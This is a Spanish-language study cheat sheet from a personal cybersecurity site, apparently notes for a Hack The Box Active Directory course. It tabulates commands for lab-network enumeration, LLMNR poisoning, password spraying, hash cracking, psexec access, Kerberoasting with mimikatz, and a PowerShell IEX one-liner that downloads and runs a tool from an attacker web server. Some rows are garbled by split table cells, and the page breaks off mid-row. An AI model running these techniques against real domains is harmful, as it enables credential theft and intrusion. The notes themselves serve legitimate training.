<!DOCTYPE html><!-- Layout específico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/apuntes.fBeTOWmP.css">
<link rel="stylesheet" href="/assets/apuntes.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si está disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-3xl mx-auto px-6"> <div class="mb-12"> <a href="/apuntes" class="text-sm text-slate-400 hover:text-accentBlue transition-colors">
← Volver a Apuntes
</a> <h1 class="text-4xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> HTB AD </h1>  <div class="flex flex-wrap gap-3">  </div> </div> <div class="prose prose-projects prose-invert prose-xl max-w-none"> <h3 id="enumeración-inicial">Enumeración Inicial</h3>





























<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>nslookup ns1.inlanefreight.com</code></td><td>Utilizado para consultar el sistema de nombres de dominio y descubrir la dirección IP para el mapeo del nombre de dominio del objetivo ingresado desde un host basado en Linux.</td></tr><tr><td><code>sudo tcpdump -i ens224</code></td><td>Utilizado para comenzar a capturar paquetes de red en la interfaz de red que precede a la opción <code>-i</code> en un host basado en Linux.</td></tr><tr><td><code>sudo responder -I ens224 -A</code></td><td>Utilizado para comenzar a responder y analizar consultas LLMNR, NBT-NS y MDNS en la interfaz especificada precediendo la opción <code>-I</code> y operando en modo de Análisis Pasivo que se activa usando <code>-A</code>. Realizado desde un host basado en Linux.</td></tr><tr><td><code>fping -asgq 172.16.5.0/23</code></td><td>Realiza un barrido de ping en el segmento de red especificado desde un host basado en Linux.</td></tr><tr><td><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td><td>Realiza un escaneo nmap con detección de SO, detección de versión, escaneo de scripts y habilitado (<code>-A</code>) basado en una lista de hosts especificada en el archivo <code>hosts.txt</code> precediendo a <code>-iL</code>. Luego envía los resultados del escaneo al archivo especificado después de la opción <code>-oN</code>. Realizado desde un host basado en Linux.</td></tr></tbody></table>
<h3 id="enumeración-de-usuarios-kerbrute">Enumeración de Usuarios (Kerbrute)</h3>

































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td><td>Usa git para clonar la herramienta kerbrute desde un host basado en Linux.</td></tr><tr><td><code>make help</code></td><td>Utilizado para listar las opciones de compilación que son posibles con <code>make</code> desde un host basado en Linux.</td></tr><tr><td><code>sudo make all</code></td><td>Utilizado para compilar un binario de Kerbrute para múltiples plataformas de SO y arquitecturas de CPU.</td></tr><tr><td><code>./kerbrute_linux_amd64</code></td><td>Utilizado para probar el binario compilado de Kerbrute elegido desde un host basado en Linux.</td></tr><tr><td><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td><td>Utilizado para mover el binario de Kerbrute a un directorio que puede configurarse para estar en la ruta (path) de un usuario de Linux. Haciendo más fácil el uso de la herramienta.</td></tr><tr><td><code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td><td>Ejecuta la herramienta Kerbrute para descubrir nombres de usuario en el dominio (<code>INLANEFREIGHT.LOCAL</code>) especificado precediendo la opción <code>-d</code> y el controlador de dominio asociado especificado precediendo <code>--dc</code> usando una lista de palabras y envía (<code>-o</code>) los resultados a un archivo especificado. Realizado desde un host basado en Linux.</td></tr></tbody></table>
<h3 id="envenenamiento-llmnrnbt-ns">Envenenamiento LLMNR/NBT-NS</h3>





































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>responder -h</code></td><td>Utilizado para mostrar las instrucciones de uso y varias opciones disponibles en Responder desde un host basado en Linux.</td></tr><tr><td><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td><td>Usa hashcat para crackear hashes NTLMv2 (<code>-m</code>) que fueron capturados por responder y guardados en un archivo (<code>forend_ntlmv2</code>). El crackeo se realiza basado en una lista de palabras especificada.</td></tr><tr><td><code>Import-Module .\Inveigh.ps1</code></td><td>Usando el cmd-let <code>Import-Module</code> de PowerShell para importar la herramienta basada en Windows <code>Inveigh.ps1</code>.</td></tr><tr><td><code>(Get-Command Invoke-Inveigh).Parameters</code></td><td>Utilizado para mostrar muchas de las opciones y funcionalidades disponibles con <code>Invoke-Inveigh</code>. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td><td>Inicia Inveigh en un host basado en Windows con suplantación (spoofing) LLMNR y NBNS habilitada y envía los resultados a un archivo.</td></tr><tr><td><code>.\Inveigh.exe</code></td><td>Inicia la implementación en C# de Inveigh desde un host basado en Windows.</td></tr><tr><td>`$regkey = “HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces”; Get-ChildItem $regkey</td><td>foreach { Set-ItemProperty -Path “$regkey$($_.pschildname)” -Name NetbiosOptions -Value 2 -Verbose}`</td></tr></tbody></table>
<h3 id="rociado-de-contraseñas-password-spraying-y-políticas-de-contraseñas">Rociado de Contraseñas (Password Spraying) y Políticas de Contraseñas</h3>

































































































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $x; done</code></td><td>Script de Bash utilizado para generar 16,079,616 combinaciones posibles de nombres de usuario desde un host basado en Linux.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td><td>Usa CrackMapExec y credenciales válidas (<code>avazquez:Password123</code>) para enumerar la política de contraseñas (<code>--pass-pol</code>) desde un host basado en Linux.</td></tr><tr><td><code>rpcclient -U "" -N 172.16.5.5</code></td><td>Usa rpcclient para descubrir información sobre el dominio a través de Sesiones Nulas SMB. Realizado desde un host basado en Linux.</td></tr><tr><td><code>rpcclient $> querydominfo</code></td><td>Usa rpcclient para enumerar la política de contraseñas en un dominio Windows objetivo desde un host basado en Linux.</td></tr><tr><td><code>enum4linux -P 172.16.5.5</code></td><td>Usa enum4linux para enumerar la política de contraseñas (<code>-P</code>) en un dominio Windows objetivo desde un host basado en Linux.</td></tr><tr><td><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></td><td>Usa enum4linux-ng para enumerar la política de contraseñas (<code>-P</code>) en un dominio Windows objetivo desde un host basado en Linux, luego presenta la salida en YAML y JSON guardados en un archivo precediendo la opción <code>-oA</code>.</td></tr><tr><td>`ldapsearch -h 172.16.5.5 -x -b “DC=INLANEFREIGHT,DC=LOCAL” -s sub ”*“</td><td>grep -m 1 -B 10 pwdHistoryLength`</td></tr><tr><td><code>net accounts</code></td><td>Utilizado para enumerar la política de contraseñas en un dominio Windows desde un host basado en Windows.</td></tr><tr><td><code>Import-Module .\PowerView.ps1</code></td><td>Usa el cmd-let <code>Import-Module</code> para importar la herramienta <code>PowerView.ps1</code> desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>Utilizado para enumerar la política de contraseñas en un dominio Windows objetivo desde un host basado en Windows.</td></tr><tr><td>`enum4linux -U 172.16.5.5</td><td>grep “user:“</td></tr><tr><td><code>rpcclient -U "" -N 172.16.5.5</code> luego <code>rpcclient $> enumdomusers</code></td><td>Usa rpcclient para descubrir cuentas de usuario en un dominio Windows objetivo desde un host basado en Linux.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 --users</code></td><td>Usa CrackMapExec para descubrir usuarios (<code>--users</code>) en un dominio Windows desde un host basado en Linux.</td></tr><tr><td>`ldapsearch -h 172.16.5.5 -x -b “DC=INLANEFREIGHT,DC=LOCAL” -s sub ”(&#x26;(objectclass=user))“</td><td>grep sAMAccountName:</td></tr><tr><td><code>./windapsearch.py --dc-ip 172.16.5.5 -u "" -U</code></td><td>Usa la herramienta de python windapsearch.py para descubrir usuarios en un dominio Windows objetivo desde un host basado en Linux.</td></tr><tr><td>`for u in $(cat valid_users.txt); do rpcclient -U “$u%Welcome1” -c “getusername;quit” 172.16.5.5</td><td>grep Authority; done`</td></tr><tr><td><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1</code></td><td>Usa kerbrute y una lista de usuarios (<code>valid_users.txt</code>) para realizar un ataque de rociado de contraseñas contra un dominio Windows objetivo desde un host basado en Linux.</td></tr><tr><td>`sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123</td><td>grep +`</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></td><td>Usa CrackMapExec para validar un conjunto de credenciales desde un host basado en Linux.</td></tr><tr><td>`sudo crackmapexec smb —local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf</td><td>grep +`</td></tr><tr><td><code>Import-Module .\DomainPasswordSpray.ps1</code></td><td>Utilizado para importar la herramienta basada en PowerShell <code>DomainPasswordSpray.ps1</code> desde un host basado en Windows.</td></tr><tr><td><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></td><td>Realiza un ataque de rociado de contraseñas y envía (<code>-OutFile</code>) los resultados a un archivo especificado (<code>spray_success</code>) desde un host basado en Windows.</td></tr></tbody></table>
<h3 id="enumeración-de-controles-de-seguridad">Enumeración de Controles de Seguridad</h3>

































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>Get-MpComputerStatus</code></td><td>Cmd-let de PowerShell utilizado para verificar el estado de Windows Defender Anti-Virus desde un host basado en Windows.</td></tr><tr><td>`Get-AppLockerPolicy -Effective</td><td>select -ExpandProperty RuleCollections`</td></tr><tr><td><code>$ExecutionContext.SessionState.LanguageMode</code></td><td>Script de PowerShell utilizado para descubrir el Modo de Lenguaje de PowerShell que se está utilizando en un host basado en Windows. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Find-LAPSDelegatedGroups</code></td><td>Una función de LAPSToolkit que descubre Grupos Delegados de LAPS desde un host basado en Windows.</td></tr><tr><td><code>Find-AdmPwdExtendedRights</code></td><td>Una función de LAPSToolkit que verifica los derechos en cada computadora con LAPS habilitado para cualquier grupo con acceso de lectura y usuarios con Todos los Derechos Extendidos. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-LAPSComputers</code></td><td>Una función de LAPSToolkit que busca computadoras que tienen LAPS habilitado, descubre expiración de contraseñas y puede descubrir contraseñas aleatorizadas. Realizado desde un host basado en Windows.</td></tr></tbody></table>
<h3 id="enumeración-con-credenciales">Enumeración con Credenciales</h3>









































































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25</code></td><td>Conecta a un objetivo Windows usando credenciales válidas. Realizado desde un host basado en Linux.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></td><td>Se autentica con un objetivo Windows a través de smb usando credenciales válidas e intenta descubrir más usuarios (<code>--users</code>) en un dominio Windows objetivo. Realizado desde un host basado en Linux.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></td><td>Se autentica con un objetivo Windows a través de smb usando credenciales válidas e intenta descubrir grupos (<code>--groups</code>) en un dominio Windows objetivo. Realizado desde un host basado en Linux.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code></td><td>Se autentica con un objetivo Windows a través de smb usando credenciales válidas e intenta verificar una lista de usuarios conectados (<code>--loggedon-users</code>) en el host Windows objetivo. Realizado desde un host basado en Linux.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></td><td>Se autentica con un objetivo Windows a través de smb usando credenciales válidas e intenta descubrir cualquier recurso compartido smb (<code>--shares</code>). Realizado desde un host basado en Linux.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Dev-Share'</code></td><td>Se autentica con un objetivo Windows a través de smb usando credenciales válidas y utiliza el módulo (<code>-M</code>) <code>spider_plus</code> de CrackMapExec para recorrer cada recurso compartido legible (<code>Dev-Share</code>) y listar todos los archivos legibles. Los resultados se emiten en JSON. Realizado desde un host basado en Linux.</td></tr><tr><td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></td><td>Enumera el dominio Windows objetivo usando credenciales válidas y lista los recursos compartidos y permisos disponibles en cada uno dentro del contexto de las credenciales válidas utilizadas y el host Windows objetivo (<code>-H</code>). Realizado desde un host basado en Linux.</td></tr><tr><td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'SYSVOL' --dir-only</code></td><td>Enumera el dominio Windows objetivo usando credenciales válidas y realiza un listado recursivo (<code>-R</code>) del recurso compartido especificado (<code>SYSVOL</code>) y solo muestra una lista de directorios (<code>--dir-only</code>) en el recurso compartido. Realizado desde un host basado en Linux.</td></tr><tr><td><code>rpcclient $> queryuser 0x457</code></td><td>Enumera una cuenta de usuario objetivo en un dominio Windows usando su identificador relativo (0x457). Realizado desde un host basado en Linux.</td></tr><tr><td><code>rpcclient $> enumdomusers</code></td><td>Descubre cuentas de usuario en un dominio Windows objetivo y sus identificadores relativos asociados (rid). Realizado desde un host basado en Linux.</td></tr><tr><td><code>psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125</code></td><td>Herramienta de Impacket utilizada para conectarse a la CLI de un objetivo Windows vía el recurso administrativo ADMIN$ con credenciales válidas. Realizado desde un host basado en Linux.</td></tr><tr><td><code>wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5</code></td><td>Herramienta de Impacket utilizada para conectarse a la CLI de un objetivo Windows vía WMI con credenciales válidas. Realizado desde un host basado en Linux.</td></tr><tr><td><code>python3 windapsearch.py -h</code></td><td>Utilizado para mostrar las opciones y funcionalidad de <code>windapsearch.py</code>. Realizado desde un host basado en Linux.</td></tr><tr><td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da</code></td><td>Utilizado para enumerar el grupo de administradores de dominio (<code>--da</code>) usando un conjunto válido de credenciales en un dominio Windows objetivo. Realizado desde un host basado en Linux.</td></tr><tr><td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU</code></td><td>Utilizado para realizar una búsqueda recursiva (<code>-PU</code>) de usuarios con permisos anidados usando credenciales válidas. Realizado desde un host basado en Linux.</td></tr><tr><td><code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all</code></td><td>Ejecuta la implementación en python de BloodHound (<code>bloodhound.py</code>) con credenciales válidas y especifica un servidor de nombres (<code>-ns</code>) y un dominio Windows objetivo (<code>inlanefreight.local</code>) así como ejecuta todas las comprobaciones (<code>-c all</code>). Ejecuta usando credenciales válidas. Realizado desde un host basado en Linux.</td></tr></tbody></table>
<h3 id="enumeración-living-off-the-land-powershell-ad-module">Enumeración “Living Off the Land” (PowerShell AD Module)</h3>









































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>Get-Module</code></td><td>Cmd-let de PowerShell utilizado para listar todos los módulos disponibles, su versión y opciones de comando desde un host basado en Windows.</td></tr><tr><td><code>Import-Module ActiveDirectory</code></td><td>Carga el módulo de PowerShell de Active Directory desde un host basado en Windows.</td></tr><tr><td><code>Get-ADDomain</code></td><td>Cmd-let de PowerShell utilizado para recopilar información del dominio Windows desde un host basado en Windows.</td></tr><tr><td><code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</code></td><td>Cmd-let de PowerShell utilizado para enumerar cuentas de usuario en un dominio Windows objetivo y filtrar por <code>ServicePrincipalName</code>. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-ADTrust -Filter *</code></td><td>Cmd-let de PowerShell utilizado para enumerar cualquier relación de confianza en un dominio Windows objetivo y filtra por cualquiera (<code>-Filter *</code>). Realizado desde un host basado en Windows.</td></tr><tr><td>`Get-ADGroup -Filter *</td><td>select name`</td></tr><tr><td><code>Get-ADGroup -Identity "Backup Operators"</code></td><td>Cmd-let de PowerShell utilizado para buscar un grupo específico (<code>-Identity "Backup Operators"</code>). Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-ADGroupMember -Identity "Backup Operators"</code></td><td>Cmd-let de PowerShell utilizado para descubrir los miembros de un grupo específico (<code>-Identity "Backup Operators"</code>). Realizado desde un host basado en Windows.</td></tr></tbody></table>
<h3 id="enumeración-con-powerview">Enumeración con PowerView</h3>









































































































































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>Export-PowerViewCSV</code></td><td>Script de PowerView utilizado para anexar resultados a un archivo csv. Realizado desde un host basado en Windows.</td></tr><tr><td><code>ConvertTo-SID</code></td><td>Script de PowerView utilizado para convertir un nombre de usuario o grupo a su SID. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainSPNTicket</code></td><td>Script de PowerView utilizado para solicitar el ticket kerberos para un nombre principal de servicio (SPN) especificado. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-Domain</code></td><td>Script de PowerView utilizado para devolver el objeto AD para el dominio actual (o especificado). Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainController</code></td><td>Script de PowerView utilizado para devolver una lista de los controladores de dominio objetivo para el dominio objetivo especificado. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainUser</code></td><td>Script de PowerView utilizado para devolver todos los usuarios u objetos de usuario específicos en AD. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainComputer</code></td><td>Script de PowerView utilizado para devolver todas las computadoras u objetos de computadora específicos en AD. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainGroup</code></td><td>Script de PowerView utilizado para devolver todos los grupos u objetos de grupo específicos en AD. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainOU</code></td><td>Script de PowerView utilizado para buscar todos o específicos objetos OU en AD. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Find-InterestingDomainAcl</code></td><td>Script de PowerView utilizado para encontrar ACLs de objetos en el dominio con derechos de modificación establecidos en objetos no integrados. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainGroupMember</code></td><td>Script de PowerView utilizado para devolver los miembros de un grupo de dominio específico. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainFileServer</code></td><td>Script de PowerView utilizado para devolver una lista de servidores que probablemente funcionan como servidores de archivos. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainDFSShare</code></td><td>Script de PowerView utilizado para devolver una lista de todos los sistemas de archivos distribuidos para el dominio actual (o especificado). Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainGPO</code></td><td>Script de PowerView utilizado para devolver todos los GPOs u objetos GPO específicos en AD. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>Script de PowerView utilizado para devolver la política de dominio predeterminada o la política del controlador de dominio para el dominio actual. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-NetLocalGroup</code></td><td>Script de PowerView utilizado para enumerar grupos locales en una máquina local o remota. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-NetLocalGroupMember</code></td><td>Script de PowerView utilizado para enumerar miembros de un grupo local específico. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-NetShare</code></td><td>Script de PowerView utilizado para devolver una lista de recursos compartidos abiertos en una máquina local (o remota). Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-NetSession</code></td><td>Script de PowerView utilizado para devolver información de sesión para la máquina local (o remota). Realizado desde un host basado en Windows.</td></tr><tr><td><code>Test-AdminAccess</code></td><td>Script de PowerView utilizado para probar si el usuario actual tiene acceso administrativo a la máquina local (o remota). Realizado desde un host basado en Windows.</td></tr><tr><td><code>Find-DomainUserLocation</code></td><td>Script de PowerView utilizado para encontrar máquinas donde usuarios específicos han iniciado sesión. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Find-DomainShare</code></td><td>Script de PowerView utilizado para encontrar recursos compartidos alcanzables en máquinas del dominio. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Find-InterestingDomainShareFile</code></td><td>Script de PowerView que busca archivos que coinciden con criterios específicos en recursos compartidos legibles en el dominio. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Find-LocalAdminAccess</code></td><td>Script de PowerView utilizado para encontrar máquinas en el dominio local donde el usuario actual tiene acceso de administrador local. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainTrust</code></td><td>Script de PowerView que devuelve confianzas de dominio para el dominio actual o un dominio especificado. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-ForestTrust</code></td><td>Script de PowerView que devuelve todas las confianzas de bosque para el bosque actual o un bosque especificado. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainForeignUser</code></td><td>Script de PowerView que enumera usuarios que están en grupos fuera del dominio del usuario. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainForeignGroupMember</code></td><td>Script de PowerView que enumera grupos con usuarios fuera del dominio del grupo y devuelve cada miembro extranjero. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>Script de PowerView que enumera todas las confianzas para el dominio actual y cualquier otro visto. Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainGroupMember -Identity "Domain Admins" -Recurse</code></td><td>Script de PowerView utilizado para listar todos los miembros de un grupo objetivo (“Domain Admins”) mediante el uso de la opción recurse (<code>-Recurse</code>). Realizado desde un host basado en Windows.</td></tr><tr><td><code>Get-DomainUser -SPN -Properties samaccountname, ServicePrincipalName</code></td><td>Script de PowerView utilizado para encontrar usuarios en el dominio Windows objetivo que tienen el Nombre Principal de Servicio establecido. Realizado desde un host basado en Windows.</td></tr><tr><td><code>.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data</code></td><td>Ejecuta una herramienta llamada Snaffler contra un dominio Windows objetivo que encuentra varios tipos de datos en recursos compartidos a los que la cuenta comprometida tiene acceso. Realizado desde un host basado en Windows.</td></tr></tbody></table>
<h3 id="transferencia-de-archivos">Transferencia de Archivos</h3>





















<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>sudo python3 -m http.server 8001</code></td><td>Inicia un servidor web python para alojamiento rápido de archivos. Realizado desde un host basado en Linux.</td></tr><tr><td><code>"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"</code></td><td>One-liner de PowerShell utilizado para descargar un archivo desde un servidor web. Realizado desde un host basado en Windows.</td></tr><tr><td><code>sudo impacket-smbserver share -smb2support /home/administrator/Downloads/</code></td><td>Inicia un servidor SMB impacket para alojamiento rápido de un archivo. Realizado desde un host basado en Linux.</td></tr></tbody></table>
<h3 id="kerberoasting">Kerberoasting</h3>

























































































































<table><thead><tr><th><strong>Comando</strong></th><th><strong>Descripción</strong></th></tr></thead><tbody><tr><td><code>sudo python3 -m pip install .</code></td><td>Utilizado para instalar Impacket desde dentro del directorio que se clona al host de ataque. Realizado desde un host basado en Linux.</td></tr><tr><td><code>GetUserSPNs.py -h</code></td><td>Herramienta de Impacket utilizada para mostrar las opciones y funcionalidad de <code>GetUserSPNs.py</code> desde un host basado en Linux.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</code></td><td>Herramienta de Impacket utilizada para obtener una lista de SPNs en el dominio Windows objetivo desde un host basado en Linux.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</code></td><td>Herramienta de Impacket utilizada para descargar/solicitar (<code>-request</code>) todos los tickets TGS para procesamiento offline desde un host basado en Linux.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</code></td><td>Herramienta de Impacket utilizada para descargar/solicitar (<code>-request-user</code>) un ticket TGS para una cuenta de usuario específica (<code>sqldev</code>) desde un host basado en Linux.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code></td><td>Herramienta de Impacket utilizada para descargar/solicitar un ticket TGS para una cuenta de usuario específica y escribir el ticket a un archivo (<code>-outputfile sqldev_tgs</code>) desde un host basado en Linux.</td></tr><tr><td><code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code></td><td>Intenta crackear el hash del ticket Kerberos (<code>-m 13100</code>) (<code>sqldev_tgs</code>) usando hashcat y una lista de palabras (<code>rockyou.txt</code>) desde un host basado en Linux.</td></tr><tr><td><code>setspn.exe -Q */*</code></td><td>Utilizado para enumerar SPNs en un dominio Windows objetivo desde un host basado en Windows.</td></tr><tr><td><code>Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"</code></td><td>Script de PowerShell utilizado para descargar/solicitar el ticket TGS de un usuario específico desde un host basado en Windows.</td></tr><tr><td>`setspn.exe -T INLANEFREIGHT.LOCAL -Q <em>/</em></td><td>Select-String ‘^CN’ -Context 0,1</td></tr><tr><td><code>mimikatz # base64 /out:true</code></td><td>Comando de Mimikatz que asegura que los tickets TGS se extraigan en formato base64 desde un host basado en Windows.</td></tr><tr><td><code>mimikatz # kerberos::list /export</code></td><td>Comando de Mimikatz utilizado para extraer los tickets TGS desde un host basado en Windows.</td></tr><tr><td>`echo ""</td><td>tr -d \n`</td></tr><tr><td>`cat encoded_file</td><td>base64 -d > sqldev.kirbi`</td></tr><tr><td><code>python2.7 kirbi2john.py sqldev.kirbi</code></td><td>Utilizado para extraer el ticket Kerberos. Esto también crea un archivo llamado <code>crack_file</code> desde un host basado en Linux.</td></tr><tr><td><code>sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat</code></td><td>Utilizado para modificar el <code>crack_file</code> para Hashcat desde un host basado en Linux.</td></tr><tr><td><code>cat sqldev_tgs_hashcat</code></td><td>Utilizado para ver el hash preparado desde un host basado en Linux.</td></tr><tr><td><code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</code></td><td>Utilizado para crackear el hash del ticket Kerberos preparado (<code>sqldev_tgs_hashcat</code>) usando una lista de palabras (<code>rockyou.txt</code>) desde un host basado en Linux.</td></tr><tr><td><code>Import-Module .\PowerView.ps1</code> seguido de `Get-DomainUser * -spn</td><td>select samaccountname`</td></tr><tr><td>`Get-DomainUser -Identity sqldev</td><td>Get-DomainSPNTicket -Format Hashcat`</td></tr><tr><td>`Get-DomainUser 